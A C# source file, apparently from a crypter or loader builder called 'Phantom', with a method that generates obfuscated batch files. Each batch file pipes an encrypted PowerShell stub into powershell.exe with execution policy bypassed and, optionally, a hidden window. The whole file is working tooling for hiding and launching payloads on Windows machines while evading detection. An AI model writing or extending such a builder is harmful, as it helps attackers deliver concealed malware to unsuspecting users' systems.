using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Phantom
{
    internal class FileGen
    {
        // Method to create batch file content
        internal static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, PhantomMain.FileType fileType, string ContentLineID, Random rng)
        {
            // Generate PowerShell command using CreatePS method from StubGen class
            string command = StubGen.CreatePS(key, iv, mode, ContentLineID, rng);
            StringBuilder output = new StringBuilder();

            // Start building the batch file content
            output.AppendLine(@"@echo off");

            // Prepare command for execution, optionally hiding the window
            string commandstart = $"-noprofile {(hidden ? @"-windowstyle hidden" : string.Empty)} -ep bypass";
            string powershellPath = @"";
            if (fileType == PhantomMain.FileType.NET64)
            {
                powershellPath = @"%systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            }
            else if (fileType == PhantomMain.FileType.NET86)
            {
                powershellPath = @"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
            }
            else if (fileType == PhantomMain.FileType.x64)
            {
                powershellPath = @"%systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            }
            else if (fileType == PhantomMain.FileType.x86)
            {
                powershellPath = @"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
            }
            output.AppendLine(Obfuscator.ObfuscateBat(@"echo " + command + $" | \"{powershellPath}\" " + commandstart, true));

            // Add exit command to terminate the batch file
            //output.Append(Obfuscator.ObfuscateBat(@"exit /b"));

            // Return the generated batch file content as a string
            return output.ToString();
        }
    }
}
